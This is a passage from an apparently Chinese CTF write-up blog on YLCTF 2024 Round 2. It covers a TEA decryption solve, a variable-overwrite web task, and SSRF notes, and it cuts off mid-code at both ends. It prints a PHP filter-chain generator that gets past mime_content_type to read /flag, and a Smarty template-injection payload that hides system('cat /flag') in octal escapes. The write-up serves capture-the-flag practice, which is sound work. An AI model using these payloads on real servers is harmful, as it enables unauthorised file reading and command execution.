&amp;= <span class="hljs-number">0xffffffff</span><br>        v0 -= (((v1 &gt;&gt; <span class="hljs-number">3</span>) ^ (<span class="hljs-number">4</span> * v1)) + v1) ^ (k[<span class="hljs-built_in">sum</span> &amp; <span class="hljs-number">3</span>] + <span class="hljs-built_in">sum</span>)<br>        v0 &amp;= <span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> [v0, v1]<br><br><span class="hljs-comment"># 目标密文</span><br>target_v0 = <span class="hljs-number">1913208188</span><br>target_v1 = -<span class="hljs-number">1240730499</span> &amp; <span class="hljs-number">0xffffffff</span>  <span class="hljs-comment"># 转换为无符号整数</span><br><br><span class="hljs-comment"># 密钥</span><br>key = [<span class="hljs-number">4097</span>, <span class="hljs-number">8194</span>, <span class="hljs-number">12291</span>, <span class="hljs-number">16388</span>]<br><br><span class="hljs-comment"># 解密</span><br>decrypted = decipher([target_v0, target_v1], key)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;解密结果: <span class="hljs-subst">&#123;decrypted&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;输入的两个标签应该是: <span class="hljs-subst">&#123;decrypted[<span class="hljs-number">0</span>]&#125;</span> 和 <span class="hljs-subst">&#123;decrypted[<span class="hljs-number">1</span>]&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h5 id="round-2-ezwasm"><a class="markdownIt-Anchor" href="#round-2-ezwasm"></a> [Round 2] ezwasm</h5><p><img src="/../../images/ylctf/2024/wasm.png" alt="wasm"></p><p>外部改成大写即可</p><h4 id="web-2"><a class="markdownIt-Anchor" href="#web-2"></a> Web</h4><h5 id="round-2-cmnts"><a class="markdownIt-Anchor" href="#round-2-cmnts"></a> [Round 2] Cmnts</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Z2V0X3RoMXNfZjFhZy5waHA=  #get<span class="hljs-emphasis">_th1s_</span>f1ag.php<br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?key=a7a795a8efb7c30151031c2cb700ddd9<br></code></pre></td></tr></table></figure><p>变量覆盖</p><h5 id="round-2-pseudo复现"><a class="markdownIt-Anchor" href="#round-2-pseudo复现"></a> [Round 2] Pseudo(复现)</h5><p>可以看到给的附件里面的下载的php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">tmpfile</span>();<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$data</span>);<br>    <span class="hljs-title function_ invoke__">fflush</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">mime_content_type</span>(<span class="hljs-title function_ invoke__">stream_get_meta_data</span>(<span class="hljs-variable">$file</span>)[<span class="hljs-string">&#x27;uri&#x27;</span>]);<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>,[<span class="hljs-string">&#x27;image/jpg&#x27;</span>,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>, <span class="hljs-string">&#x27;image/png&#x27;</span>, <span class="hljs-string">&#x27;image/gif&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error!!!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Description: File Transfer&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;download.jpg&quot;&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Expires: 0&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Cache-Control: must-revalidate&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Pragma: public&#x27;</span>);<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以利用这里的函数漏洞得到flag，关键点是需要绕过<code>mime_content_type</code>函数，可以利用filterchain进行绕过得到flag</p><p>下面是脚本，或者用GitHub上面的脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$base64_payload</span> = <span class="hljs-string">&quot;R0lGODlB&quot;</span>; <span class="hljs-comment">/*GIF89A*/</span><br><span class="hljs-variable">$conversions</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;/&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,<br>    <span class="hljs-string">&#x27;0&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;1&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;2&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,<br>    <span class="hljs-string">&#x27;3&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;4&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;5&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE&#x27;</span>,<br><span class="hljs-string">&#x27;6&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,<br>    <span class="hljs-string">&#x27;7&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;8&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;9&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;A&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;B&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;C&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,<br>    <span class="hljs-string">&#x27;D&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;E&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,<br>    <span class="hljs-string">&#x27;F&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;G&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,<br>    <span class="hljs-string">&#x27;H&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;I&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;J&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;K&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;L&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,<br>    <span class="hljs-string">&#x27;M&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,<br>    <span class="hljs-string">&#x27;N&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;O&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,<br>    <span class="hljs-string">&#x27;P&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;Q&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;R&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,<br><span class="hljs-string">&#x27;S&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,<br>    <span class="hljs-string">&#x27;T&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,<br>    <span class="hljs-string">&#x27;U&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,<br>    <span class="hljs-string">&#x27;V&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;W&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,<br>    <span class="hljs-string">&#x27;X&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,<br>    <span class="hljs-string">&#x27;Y&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,<br><span class="hljs-string">&#x27;Z&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,<br>    <span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;c&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,<br>    <span class="hljs-string">&#x27;d&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;e&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,<br>    <span class="hljs-string">&#x27;f&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;g&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,<br>    <span class="hljs-string">&#x27;h&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;i&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,<br><span class="hljs-string">&#x27;j&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,<br>    <span class="hljs-string">&#x27;k&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;l&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;m&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,<br>    <span class="hljs-string">&#x27;n&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,<br>    <span class="hljs-string">&#x27;o&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;p&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,<br>    <span class="hljs-string">&#x27;q&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;r&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,<br>    <span class="hljs-string">&#x27;s&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,<br>    <span class="hljs-string">&#x27;t&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,<br>    <span class="hljs-string">&#x27;u&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,<br>    <span class="hljs-string">&#x27;v&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932&#x27;</span>,<br>    <span class="hljs-string">&#x27;w&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;x&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,<br>    <span class="hljs-string">&#x27;y&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,<br>    <span class="hljs-string">&#x27;z&#x27;</span> =&gt; <span class="hljs-string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,<br>);<br><br><span class="hljs-variable">$filters</span> = <span class="hljs-string">&quot;convert.base64-encode|&quot;</span>;<br><span class="hljs-comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br><span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$base64_payload</span>)) <span class="hljs-keyword">as</span> <span class="hljs-variable">$c</span>) &#123;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-variable">$conversions</span>[<span class="hljs-variable">$c</span>] . <span class="hljs-string">&quot;|&quot;</span>;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.base64-decode|&quot;</span>;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.base64-encode|&quot;</span>;<br>    <span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$filters</span> .= <span class="hljs-string">&quot;convert.base64-decode&quot;</span>;<br><br><span class="hljs-variable">$final_payload</span> = <span class="hljs-string">&quot;php://filter/<span class="hljs-subst">&#123;$filters&#125;</span>/resource=/flag&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$final_payload</span>;<br></code></pre></td></tr></table></figure><p><img src="/../../images/ylctf/2024/pseudo.png" alt="pseudo"></p><h5 id="round-2-phupe复现"><a class="markdownIt-Anchor" href="#round-2-phupe复现"></a> [Round 2] PHUPE(复现)</h5><p>这题写的时候的思路就是尝试文件上传进行smarty的模板注入，但是没有成功。</p><h6 id="0x01"><a class="markdownIt-Anchor" href="#0x01"></a> 0x01</h6><p>TPL是Smarty模板引擎使用的模板文件格式，它允许将PHP逻辑代码与HTML展示代码分离,使用特殊的标签语法 {标签} 来实现动态内容。</p><p>smarty 可以使用 math + 8进制进行绕过</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;extends file=&#x27;views/layout.tpl&#x27;&#125;<br>&#123;block name=content&#125;<br>    &lt;h1&gt;CTF File Reader&lt;/h1&gt;<br>    &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;<br>        &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;<br>        &lt;button type=&quot;submit&quot;&gt;Upload&lt;/button&gt;<br>    &lt;/form&gt;<br>    &lt;pre&gt;&#123;$file_content&#125;&lt;/pre&gt;<br>&#123;math equation=&quot;(\&quot;\\163\\171\\163\\164\\145\\155\&quot;)(\&quot;\\143\\141\\164\\40\\57\\146\\154\\141\\147\&quot;)&quot;&#125;<br>&#123;/block&#125;<br></code></pre></td></tr></table></figure><p>~~跟着复现没有成功,感觉可能中间跳步骤了。~~时隔一周回来填坑，确实是自己的问题，没有好好研究给的附件，需要在对应的文件上进行文件的覆盖</p><p><img src="/../../images/ylctf/2024/phu.png" alt="phu"></p><p>然后就有flag了</p><h6 id="0x02"><a class="markdownIt-Anchor" href="#0x02"></a> 0x02</h6><p><a href="https://www.anquanke.com/post/id/103784">从0CTF一道题看move_uploaded_file的一个细节问题</a>,参考链接</p><h5 id="round-2-redfox复现"><a class="markdownIt-Anchor" href="#round-2-redfox复现"></a> [Round 2] RedFox(复现)</h5><p>先注册一个账号进行登陆</p><p>有一个上传评论的地方，发现可以有ssrf的漏洞(当时其实想到这层了，没注意回显包)</p><p><img src="/../../images/ylctf/2024/redfox1.png" alt="redfox1"></p><p><img src="/../../images/ylctf/2024/redfox2.png" alt="redfox2"></p><p>然后测试一下/flag有无发现没有，</p><p>/uploads/profile_0f1726ba83325848d47e216b29d5ab99.jpg，<s>后面我也没找到本地文件，先到这吧。</s>,继续来填坑。</p><p>不能直接读到flag，尝试读<code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;Database.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;User.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;Post.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;Message.php&#x27;</span>;<br><br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Database</span>();<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-variable">$db</span>);<br><span class="hljs-variable">$post</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Post</span>(<span class="hljs-variable">$db</span>);<br><span class="hljs-variable">$message</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(<span class="hljs-variable">$db</span>);<br><br><span class="hljs-variable">$error</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$success</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span 